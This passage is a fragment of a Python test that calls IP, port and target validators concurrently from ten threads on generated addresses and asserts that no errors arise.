                    validate_ip(f"192.168.{i//256}.{i%256}")
                    validate_port(i % 65536)
                    validate_target(f"target-{i}.example.com")
            except Exception as e:
                errors.append(str(e))
        threads = [threading.Thread(target=validate_batch) for _ in range(10)]
        for t in threads: t.start()
        for t in threads: t.join()
        assert errors == []
